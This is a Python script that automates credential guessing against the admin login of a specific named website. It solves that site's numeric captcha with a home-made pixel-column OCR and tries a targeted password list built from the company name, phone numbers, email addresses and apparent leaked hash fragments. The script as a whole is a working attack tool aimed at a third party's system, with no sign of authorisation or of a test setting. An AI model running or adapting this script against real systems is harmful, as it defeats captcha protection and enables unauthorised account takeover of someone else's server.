#!/usr/bin/env python3
"""bjhzsv.com auto-login v2 - 100+ passwords, captcha OCR"""
import struct, requests, io, sys, os
from PIL import Image

BASE = "http://bjhzsv.com"
session = requests.Session()

# Digit templates from training data
# Format: for each digit 0-9, list of [col0_sum, col1_sum, ...]
# Column sums are pixel counts (0-10) for the digit segment
DIGIT_COLORS = {'r_max': 80, 'g_max': 180, 'b_min': 0}
NOISE_COLORS = {'r_max': 80, 'g_min': 180}

def get_captcha():
    """Download captcha and return raw bytes"""
    session.get(f"{BASE}/main/index.asp")
    r = session.get(f"{BASE}/main/inc/code.asp")
    return r.content

def is_digit_pixel(r, g, b):
    return r < DIGIT_COLORS['r_max'] and g < DIGIT_COLORS['g_max']

def get_column_sums(pixels, w, h):
    cols = []
    for x in range(w):
        cnt = 0
        for y in range(h):
            idx = y * w + x
            r, g, b = pixels[idx]
            if is_digit_pixel(r, g, b):
                cnt += 1
        cols.append(cnt)
    return cols

def find_segments(cols, min_col=2):
    segs = []
    in_digit = False
    start = 0
    for i, c in enumerate(cols):
        if c >= min_col and not in_digit:
            start = i
            in_digit = True
        elif c < min_col and in_digit:
            if i - start >= 3:  # minimum digit width
                segs.append((start, i - 1))
            in_digit = False
    if in_digit and len(cols) - start >= 3:
        segs.append((start, len(cols) - 1))
    return segs

def match_segment(cols_seg, h=10):
    """Match a column segment against digit templates using feature matching"""
    if not cols_seg:
        return '?'
    w = len(cols_seg)
    # Build binary row pattern for this segment
    rows = []
    for y in range(h):
        row_bits = 0
        for x in range(w):
            pass  # we'll use column sums instead
    
    # Use heuristic features:
    # - top bar present (cols 0-2 in top quarter)
    # - bottom bar present (cols 0-2 in bottom quarter)
    # - left vertical (all rows have pixel in col 0)
    # - right vertical (all rows have pixel in last col)
    # - middle bar present
    
    top_pct = sum(cols_seg[:3]) / (3 * h) if len(cols_seg) >= 3 else 0
    bot_pct = sum(cols_seg[-3:]) / (3 * h) if len(cols_seg) >= 3 else 0
    
    # Full left/right columns
    left_full = cols_seg[0] >= h * 0.7 if len(cols_seg) > 0 else False
    right_full = cols_seg[-1] >= h * 0.7 if len(cols_seg) > 0 else False
    
    left_mid = cols_seg[0] >= h * 0.3 if len(cols_seg) > 0 else False
    right_mid = cols_seg[-1] >= h * 0.3 if len(cols_seg) > 0 else False
    
    top_bar = top_pct > 0.5
    bot_bar = bot_pct > 0.5
    
    # Middle bar present? Check middle rows of left column
    mid_idx = h // 2
    mid_left = False
    if len(cols_seg) > 0:
        mid_left = cols_seg[0] > mid_idx
    
    # Pattern matching
    if top_bar and bot_bar:
        if left_full and right_full: return '0'
        if left_full and not right_full: return '6'
        if not left_full and right_full: return '9'
        if not left_full and not right_full:
            if left_mid and right_mid: return '8'
            return '3'
    
    if top_bar and not bot_bar:
        if not left_full and right_full: return '2'
        if left_full and right_full: return '9'
        return '3'
    
    if not top_bar and bot_bar:
        if left_full and not right_full: return '6'
        return '5'
    
    if not top_bar and not bot_bar:
        if left_full and right_full and mid_left: return '8'
        if not left_full and right_full: return '1'
        if left_full and right_mid: return '4'
        return '7'
    
    return '?'

def read_captcha(data):
    """Read 4 digits from captcha BMP"""
    try:
        img = Image.open(io.BytesIO(data))
        if img.mode != 'RGB':
            img = img.convert('RGB')
        w, h = img.size
        pixels = list(img.getdata())
        
        # Save enlarged version for debugging
        if len(sys.argv) > 1 and sys.argv[1] == '--debug':
            big = img.resize((w*10, h*10), Image.NEAREST)
            big.save('/tmp/captcha_debug.png')
        
        cols = get_column_sums(pixels, w, h)
        segs = find_segments(cols)
        
        if len(segs) != 4:
            # Try different threshold
            segs = find_segments(cols, min_col=1)
            if len(segs) != 4:
                return None, segs, cols
        
        digits = ''
        for s, e in segs:
            segment = cols[s:e+1]
            d = match_segment(segment, h)
            digits += d
        
        return digits, segs, cols
    except Exception as e:
        return None, str(e), []

def try_login(username, password, captcha):
    """Attempt login with given captcha"""
    data = {'t1': username, 't2': password, 't3': captcha}
    r = session.post(f"{BASE}/main/a7chkuser.asp", data=data)
    resp = r.text
    
    # Check result
    if 'history.go' not in resp and ('index.asp' in resp or 'main.asp' in resp):
        return 'SUCCESS'
    if '密码' in resp or 'password' in resp.lower():
        return 'WRONG_PASSWORD'
    if '验证码' in resp or 'captcha' in resp.lower() or 'code' in resp.lower():
        return 'WRONG_CAPTCHA'
    return f'UNKNOWN(len={len(resp)})'

# Password list
passwords = [
    # Basic
    'admin', 'admin888', 'admin666', 'admin999', 'admin000', 'admin123', 'admin1234', 'admin12345', 'admin123456',
    '123456', '12345678', '123456789', '1234567890', '111111', '000000', '666666', '888888', '999999',
    'password', 'pass123', 'pass1234', 'P@ssw0rd', 'password123',
    'root', 'root123', 'root888', 'rootadmin',
    'test', 'test123', 'guest',
    # Company related
    'bjhzsv', 'bjhzsv.com', 'hzsv', 'hzsv888', 'hzsvadmin', 'hzsv123', 'hzsv2024',
    'beijinghzsv', 'bjhzsv2024', 'bjhzsv2025', 'bjhzsv2026',
    'hzsv123456', 'hzsvadmin123',
    # Phone
    '13681449049', '01062489782', '19908888893',
    '1368144', '62489782',
    # Email
    'admin@bjhzsv.com', 'admin@hzsv.com',
    # Year combos
    'admin2024', 'admin2025', 'admin2026', 'admin2027',
    'admin@2024', 'admin@2025', 'admin@2026',
    'admin#2024', 'admin#2025',
    'admin!2024', 'admin!2025',
    'Admin2024', 'Admin2025', 'ADMIN2024',
    # Symbol combos
    'admin!@#', 'admin@123', 'admin#123', 'admin$123',
    'admin!', 'admin@', 'admin#',
    'admin.123', 'admin-123', 'admin_123',
    # Chinese common
    'zhangli', 'zhangli123', 'li123',
    'wang123', 'zhao123',
    # Database hash hints
    '2d9d5942943a1323', '79dca16741891333',
    'admin2d9d', 'admin79dc',
    'hzsvadmin999', 'hzsvadmin888',
    # More
    'administrator', 'admin1', 'admin12',
    'a123456', 'a12345678', 'a123456789',
    '13800138000', 'admin001', 'admin002',
    'bjhzsvadmin', 'hzsv_2024', 'hzsv_2025',
    'admin.hzsv', 'admin_bjhzsv',
    '123456a', '123456abc', 'abc123',
    'adminabc', 'abcadmin',
    'server', 'server123', 'manager',
    'bjadmin', 'beijingadmin',
    # Simple numbers
    'admin520', 'admin521', 'admin1314',
    'admin110', 'admin119', 'admin120',
]

def main():
    print(f"[*] Loaded {len(passwords)} passwords")
    
    for i, pw in enumerate(passwords):
        print(f"\r[*] Attempt {i+1}/{len(passwords)}: admin:{pw}", end='', flush=True)
        
        # Get captcha
        data = get_captcha()
        captcha, segs, cols = read_captcha(data)
        
        if not captcha or '?' in captcha:
            print(f"\n[!] Captcha recognition failed (segs={segs}), retrying...")
            continue
        
        # Try login
        result = try_login('admin', pw, captcha)
        
        if result == 'SUCCESS':
            print(f"\n\n[!!!] SUCCESS! admin:{pw}")
            return
        elif result == 'WRONG_CAPTCHA':
            print(f"\n[!] Wrong captcha ({captcha}), retrying...")
            continue
        elif result == 'UNKNOWN':
            print(f"\n[?] Unknown response for {pw}, continuing...")
    
    print(f"\n\n[!] All {len(passwords)} passwords failed.")

if __name__ == '__main__':
    main()
